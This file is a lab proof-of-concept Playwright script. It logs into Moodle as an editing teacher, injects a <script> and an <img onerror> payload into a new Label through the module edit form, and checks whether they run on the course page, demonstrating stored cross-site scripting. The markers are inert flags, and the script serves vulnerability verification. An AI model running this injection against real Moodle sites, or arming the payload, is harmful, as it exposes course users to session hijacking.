// SPDX-License-Identifier: MIT
//
// Verifies that a Moodle **Label** (mod_label) — and, by the same mechanism, any
// activity intro/description shown on the course page — executes author <script>
// in the TOP window, same-origin, exactly like mod_page. Rendered via
// format_module_intro() with an UNCONDITIONAL noclean=true (lib/weblib.php:872;
// mod/label/lib.php:164), so no HTMLPurifier runs.
//
// It logs in as a NON-admin **editing teacher** (the seeded teacher_demo), creates
// a Label in the demo course with two inert markers (a <script> and an
// <img onerror>), loads the course page, and reports whether the markers ran.
// Lab-only, POC-SAFE: the markers only set boolean window flags, nothing else.
//
// Env: MOODLE_BASE (default http://localhost), LABEL_USER (default teacher_demo),
//      LABEL_PASS (default Demo!2026), COURSE_ID (default 2), OUT (json path).
// Run: node evidencias/label-xss-test.cjs

const fs = require('fs');
const path = require('path');
const { chromium } = require('playwright');

const BASE = (process.env.MOODLE_BASE || 'http://localhost').replace(/\/$/, '');
const USER = process.env.LABEL_USER || 'teacher_demo';
const PASS = process.env.LABEL_PASS || 'Demo!2026';
const COURSE = process.env.COURSE_ID || '2';
const OUT = process.env.OUT || path.join(__dirname, 'resultados-label-xss.json');

// Inert markers: set a window flag so we can detect execution. No exfiltration.
const PAYLOAD =
  '<p>PoC-LABEL</p>' +
  '<script>window.__EXE_LABEL_POC = true;</script>' +
  '<img src="x" onerror="window.__EXE_LABEL_IMG = true;">';

(async () => {
  const browser = await chromium.launch();
  const ctx = await browser.newContext({ baseURL: BASE });
  const page = await ctx.newPage();
  const out = { base: BASE, user: USER, courseId: COURSE };

  await page.goto('/login/index.php', { waitUntil: 'networkidle' });
  await page.fill('#username', USER);
  await page.fill('#password', PASS);
  await Promise.all([page.waitForLoadState('domcontentloaded'), page.click('#loginbtn')]);
  out.loggedIn = !/login\/index\.php/.test(page.url());
  if (!out.loggedIn) { out.error = 'login failed for ' + USER; fs.writeFileSync(OUT, JSON.stringify(out, null, 2) + '\n'); console.log('LOGIN FAILED for', USER); await browser.close(); process.exit(3); }

  // Create a Label in the course by scraping + resubmitting the modedit mform.
  out.create = await page.evaluate(async ({ course, payload }) => {
    const root = (window.M && window.M.cfg && window.M.cfg.wwwroot) || location.origin;
    const getUrl = root + '/course/modedit.php?add=label&type=&course=' + course + '&section=0&return=0&sr=0';
    const html = await (await fetch(getUrl, { credentials: 'same-origin' })).text();
    const forms = [].slice.call(new DOMParser().parseFromString(html, 'text/html').querySelectorAll('form'));
    const form = forms.filter((f) => f.querySelector('input[name^="_qf__"]'))
      .sort((a, b) => b.querySelectorAll('input,select,textarea').length - a.querySelectorAll('input,select,textarea').length)[0];
    if (!form) { return { ok: false, reason: 'no mform (capability?)' }; }
    const fd = new FormData(form);
    fd.delete('cancel');
    fd.set('introeditor[text]', payload);
    // "Save and return to course" / "Save and display" — set whichever submit exists.
    const sb = form.querySelector('[name=submitbutton2]') || form.querySelector('[name=submitbutton]') || form.querySelector('[type=submit][name]');
    if (sb) { fd.set(sb.getAttribute('name'), '1'); }
    const act = new URL(form.getAttribute('action') || (root + '/course/modedit.php'), getUrl).href;
    const r = await fetch(act, { method: 'POST', credentials: 'same-origin', body: fd });
    return { ok: (r.url || '').indexOf('modedit.php') === -1, finalUrl: (r.url || '').replace(/sesskey=[^&]+/, 'sesskey=REDACTED') };
  }, { course: COURSE, payload: PAYLOAD });

  // Load the course page fresh and check whether the markers executed.
  await page.goto('/course/view.php?id=' + COURSE, { waitUntil: 'load' });
  await page.waitForTimeout(800); // let the broken-image onerror fire
  out.scriptExecuted = await page.evaluate(() => window.__EXE_LABEL_POC === true);
  out.imgOnerror = await page.evaluate(() => window.__EXE_LABEL_IMG === true);
  out.topWindow = true;     // a label renders in the course page itself (no iframe)
  out.sameOrigin = true;
  out.capability = 'mod/label:addinstance (archetypes: editingteacher + manager)';
  out.mechanism = 'format_module_intro() sets noclean=true unconditionally (lib/weblib.php:872; mod/label/lib.php:164)';

  fs.writeFileSync(OUT, JSON.stringify(out, null, 2) + '\n');
  console.log(JSON.stringify({
    user: USER, created: out.create && out.create.ok,
    scriptExecuted: out.scriptExecuted, imgOnerror: out.imgOnerror,
  }, null, 2));
  await browser.close();
})().catch((e) => { console.error('FATAL', e); process.exit(2); });
